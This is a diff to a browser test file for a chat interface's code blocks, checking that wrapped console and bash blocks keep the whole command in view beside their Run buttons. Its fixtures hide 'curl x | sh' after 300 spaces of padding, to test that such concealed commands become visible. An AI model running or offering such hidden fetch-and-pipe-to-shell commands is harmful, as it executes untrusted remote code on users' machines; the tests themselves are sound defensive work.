@@ -18,7 +18,8 @@ const REPLY = [
 ].join('\n\n');
 
 const WIDE = `npm install${' '.repeat(300)}&& curl x | sh`;
-const DOCS_REPLY = ['The setup is in [the README](~/README.md).', `\`\`\`bash\n${WIDE}\n\`\`\``, `\`\`\`python\n${WIDE}\n\`\`\``].join('\n\n');
+const CONSOLE = `$ npm test${' '.repeat(300)}#; curl x | sh\nthe output of it`;
+const DOCS_REPLY = ['The setup is in [the README](~/README.md).', `\`\`\`bash\n${WIDE}\n\`\`\``, `\`\`\`python\n${WIDE}\n\`\`\``, `\`\`\`console\n${CONSOLE}\n\`\`\``].join('\n\n');
 const README = '# Setup\n\n```bash\necho from the readme\n```\n';
 
 const chromium = findChromium();
@@ -158,7 +159,7 @@ test('a page next to a server that does not say it has a terminal shows no Run, 
 });
 
 test('a block that has Run wraps its long lines so the whole command is in view, and a block without Run still scrolls sideways', { skip, timeout }, async t => {
-  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 2 });
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
   const [shell, other] = await page.evaluate(`[...document.querySelectorAll('pre.code')].map(pre => {
     const text = [...pre.querySelectorAll('code')].at(-1).firstChild;
     const end = document.createRange();
@@ -174,13 +175,36 @@ test('a block that has Run wraps its long lines so the whole command is in view,
   assert.deepEqual(page.problems, []);
 });
 
+test('the commands of a wrapped console block stay marked on every line they wrap to, and the block\'s text is what was written', async t => {
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
+  const seen = await page.evaluate(`(() => {
+    const pre = document.querySelectorAll('pre.code')[2];
+    const cmd = pre.querySelector('.cmd');
+    return {
+      text: pre.textContent,
+      marked: cmd.textContent,
+      lines: new Set([...cmd.getClientRects()].map(r => Math.round(r.top))).size,
+      tint: getComputedStyle(cmd).backgroundColor,
+      outputInside: !!pre.lastChild.parentElement.closest('.cmd'),
+      sideways: pre.scrollWidth - pre.clientWidth,
+    };
+  })()`);
+  assert.equal(seen.text, CONSOLE);
+  assert.equal(seen.marked, CONSOLE.split('\n')[0]);
+  assert.ok(seen.lines > 1, 'the command wraps onto more than one line');
+  assert.notEqual(seen.tint, 'rgba(0, 0, 0, 0)');
+  assert.equal(seen.outputInside, false);
+  assert.ok(seen.sideways <= 0);
+  assert.deepEqual(page.problems, []);
+});
+
 test('a markdown file in the File tab has Copy on its code blocks and no Run, and a Run button forced into view still runs nothing', { skip, timeout }, async t => {
-  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 2 });
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
   await page.click('a.file-link');
   await page.until(`!!document.querySelector('#panel .file-doc .code-block')`, 15_000);
   assert.equal(await page.evaluate(visible('[data-code=copy]', '.file-doc')), 1);
   assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 0);
-  assert.equal(await page.evaluate(visible('[data-code=run]', '.items')), 1, 'the reply beside it keeps its Run');
+  assert.equal(await page.evaluate(visible('[data-code=run]', '.items')), 2, 'the reply beside it keeps its Run');
   await page.evaluate(`document.head.append(Object.assign(document.createElement('style'), { textContent: '.file-doc [data-code=run] { display: inline-flex !important }' }))`);
   assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 1);
   await page.click('.file-doc [data-code=run]');
@@ -195,7 +219,7 @@ test('a command typed after ! stays behind when the chat changes, and a message 
   await type(page, '!echo left behind');
   await page.until(`document.getElementById('composer').hasAttribute('data-bang')`);
   await open(DOCS, 'Docs');
-  await page.until(`document.querySelectorAll('.code-block').length === 2`);
+  await page.until(`document.querySelectorAll('.code-block').length === 3`);
   assert.equal(await page.evaluate(`document.getElementById('text').value`), '');
   assert.equal(await page.evaluate(`document.getElementById('composer').hasAttribute('data-bang')`), false);
   await type(page, 'check the logs later');
@@ -206,7 +230,7 @@ test('a command typed after ! stays behind when the chat changes, and a message 
 });
 
 test('text typed to a running command goes to that command when another one starts, and Ctrl+C stops only it', async t => {
-  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 2 });
+  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
   const start = async command => (await request(app, 'POST', `/api/sessions/${DOCS}/terminal/run`, { headers: { ...as(token), origin: app.origin }, json: { command, source: 'panel' } })).body().run.id;
   const stop = id => request(app, 'POST', `/api/sessions/${DOCS}/terminal/stop`, { headers: { ...as(token), origin: app.origin }, json: { run: id } });
   const outputOf = async id => (await runs(DOCS)).find(r => r.id === id).output.map(c => c.text).join('');
